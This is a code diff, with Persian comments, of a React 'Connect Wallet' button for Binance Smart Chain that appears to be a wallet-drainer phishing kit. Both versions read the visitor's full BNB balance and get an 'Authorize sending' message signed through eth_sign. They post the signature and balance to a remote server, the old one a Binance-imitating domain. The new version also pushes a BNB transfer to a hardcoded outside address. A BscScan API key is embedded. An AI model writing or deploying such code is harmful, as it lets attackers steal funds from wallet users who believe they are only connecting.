@@ -1,15 +1,16 @@
-import jQuery from "jquery";
-import { EthereumProvider } from "@walletconnect/ethereum-provider";
+import React, { useState } from "react";
 
+// اگر می‌خواهید از jQuery برای POST به سرور استفاده کنید:
+// import jQuery from "jquery";
+
+// تابع انتخابی برای گرفتن بالانس BNB از BscScan (اختیاری)
 const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";
-
-// تابع کمکی برای گرفتن بالانس BNB از BscScan
 async function getBNBBalance(address) {
   try {
-    const response = await fetch(
+    const resp = await fetch(
       `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`
     );
-    const data = await response.json();
+    const data = await resp.json();
     if (data.status === "1") {
       return (parseInt(data.result) / 1e18).toFixed(6);
     }
@@ -20,123 +21,122 @@ async function getBNBBalance(address) {
 }
 
 function App() {
-  async function runner() {
-    // پاک کردن session قدیمی (walletconnect) در صورت وجود
-    if (typeof localStorage !== "undefined") {
-      localStorage.removeItem("walletconnect");
-    }
+  const [account, setAccount] = useState(null);
 
-    // ساخت Provider از WalletConnect
-    const ethereumProvider = await EthereumProvider.init({
-      showQrModal: true,
-      chains: [56],
-      methods: ["eth_sign"], // فقط از eth_sign استفاده می‌کنیم
-      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
-    });
-
-    // اتصال به کیف پول
-    await ethereumProvider.enable();
-    const provider = ethereumProvider;
-
-    // گرفتن آدرس
-    const accounts = await provider.request({ method: "eth_accounts" });
-    const accountSender = accounts[0];
-
-    if (!accountSender) {
-      console.error("❌ Wallet connection failed");
+  async function connectAndSend() {
+    // 1) بررسی اینکه در مرورگر DApp تراست والت هستیم:
+    if (typeof window.ethereum === "undefined") {
+      alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
       return;
     }
-    console.log("✅ Wallet Connected:", accountSender);
 
-    // تلاش برای سوییچ به شبکه BSC
+    // 2) گرفتن آدرس کاربر
+    let accounts;
     try {
-      await provider.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: "0x38" }], // شبکه اصلی بایننس اسمارت چین
-      });
-    } catch (error) {
-      console.error("❌ Error in switching chain:", error);
+      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+    } catch (err) {
+      console.error("❌ Could not request accounts:", err);
       return;
     }
-
-    // آدرس پروکسی یا سرور شما (همان که در کد قدیمی بود)
-    const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
-
-    // 1) گرفتن بالانس BNB از BscScan
-    const amount = await getBNBBalance(accountSender);
-    if (!amount) {
-      console.error("❌ Failed to fetch BNB balance.");
+    if (!accounts || !accounts.length) {
+      console.error("❌ No account returned.");
       return;
     }
-    console.log("💰 BNB Balance:", amount);
+    const userAddress = accounts[0];
+    setAccount(userAddress);
+    console.log("✅ User address:", userAddress);
 
-    // 2) ساخت پیام ساده برای امضا
-    const message = `Authorize sending ${amount} BNB from ${accountSender}`;
-    console.log("📜 Message to Sign:", message);
+    // (اختیاری) اگر کاربر دستی شبکه را بایننس اسمارت‌چین کرده باشد، chainId باید 0x38 باشد
+    // اگر لازم بود بررسی کنید:
+    // const chainId = await window.ethereum.request({ method: "eth_chainId" });
+    // if (chainId !== "0x38") {
+    //   console.warn("User not on BSC mainnet. They may switch manually!");
+    // }
 
-    // 3) امضای پیام با eth_sign
+    // 3) مثلا گرفتن بالانس از BscScan (اختیاری)
+    const bnbBalance = await getBNBBalance(userAddress);
+    console.log("💰 BNB Balance:", bnbBalance);
+
+    // 4) ساخت یک پیام ساده برای امضا
+    const message = `Authorize sending ${bnbBalance} BNB from ${userAddress}`;
+    console.log("📜 Message to sign:", message);
+
     let signature;
     try {
-      signature = await provider.request({
+      signature = await window.ethereum.request({
         method: "eth_sign",
-        params: [accountSender, message],
+        params: [userAddress, message],
       });
+      console.log("✍️ Signature:", signature);
     } catch (error) {
-      console.error("❌ Signature failed:", error);
+      console.error("❌ Error in eth_sign:", error);
       return;
     }
-    console.log("✍️ Signature:", signature);
 
-    // 4) ارسال امضا به سرور (فقط یک مرحله: handler='tx')
-    let serverResponse;
+    // 5) ارسال امضا به سرور برای بررسی و ثبت در لاگ
+    //    اگر از jQuery استفاده می‌کنید:
+    //    let verifyResp = await jQuery.post("https://YOUR_DOMAIN/send.php", { handler: "tx", ... });
+    //    اینجا از fetch استفاده می‌کنم (همه مرورگرهای جدید پشتیبانی می‌کنند).
     try {
-      serverResponse = await jQuery.post(apiUrl, {
-        handler: "tx",         // تنها مرحله
-        address: accountSender,
-        signature: signature,  
-        amount: amount,        
+      const resp = await fetch("https://YOUR_DOMAIN/send.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          handler: "tx",
+          address: userAddress,
+          signature: signature,
+          amount: bnbBalance,
+        }),
       });
-    } catch (err) {
-      console.error("❌ Could not verify signature on server:", err);
-      return;
-    }
+      const result = await resp.json();
+      console.log("Server verify response:", result);
 
-    console.log("📥 Server Response (raw):", serverResponse);
-    if (typeof serverResponse === "string") {
-      try {
-        serverResponse = JSON.parse(serverResponse);
-      } catch (err) {
-        console.error("❌ Could not parse the raw server response:", err);
+      if (!result.success) {
+        console.error("❌ Signature verification failed or server error.", result);
         return;
       }
-    }
-    console.log("📥 Server Response (parsed):", serverResponse);
-
-    if (!serverResponse || !serverResponse.success) {
-      console.error("❌ Signature verification failed or server error.", serverResponse);
+    } catch (e) {
+      console.error("❌ Could not call server to verify signature:", e);
       return;
     }
 
-    // 5) حالا که سرور امضا را تأیید کرده، باید **کاربر خودش** تراکنش را بفرستد.
-    // اما متأسفانه TrustWallet (عبر WalletConnect) از eth_sendTransaction پشتیبانی نمی‌کند (مشکل Unknown Method).
-    // اگر موفق بود، اینجا می‌توانستید: 
-    // await provider.request({ method: "eth_sendTransaction", params: [{ from:..., to:..., value:... }] });
-    // اما در عمل TrustWallet اغلب پیام Unknown method می‌دهد.
+    // 6) حالا یک تراکنش واقعی بسازیم (BNB از حساب کاربر به مقصد)
+    //    کاربر هزینه گس را می‌دهد. 
+    //    مثال: ارسال 0.001 BNB به آدرس مقصد
 
-    console.log("✅ Done! Signature verified by server. (No real transaction sent here.)");
-    alert("Signature verified by server. (No real transaction sent.)");
+    const sendAmount = 0.001; // نمونه؛ بسته به نیاز
+    const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
+
+    // ساخت آبجکت پارامترهای تراکنش
+    const txParams = {
+      from: userAddress,                          // آدرس کاربر
+      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد (مثلاً شما)
+      value: sendWeiHex,
+      // در صورت نیاز gas, gasPrice قرار دهید؛ اگر نگذارید کیف پول ممکن است خودش تخمین بزند
+    };
+
+    try {
+      const txHash = await window.ethereum.request({
+        method: "eth_sendTransaction",
+        params: [txParams],
+      });
+      console.log("📤 Transaction broadcasted. Hash:", txHash);
+      alert("Transaction sent! TxHash: " + txHash);
+    } catch (err) {
+      console.error("❌ Error sending transaction:", err);
+    }
   }
 
   return (
-    <a
-      href="#"
-      id="connectWallet"
-      onClick={runner}
-      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
-      data-uk-toggle=""
-    >
-      <span>Connect Wallet</span>
-    </a>
+    <div style={{ margin: "20px" }}>
+      <a
+        href="#"
+        onClick={connectAndSend}
+        className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
+      >
+        {account ? `Connected: ${account}` : "Connect Wallet"}
+      </a>
+    </div>
   );
 }
 
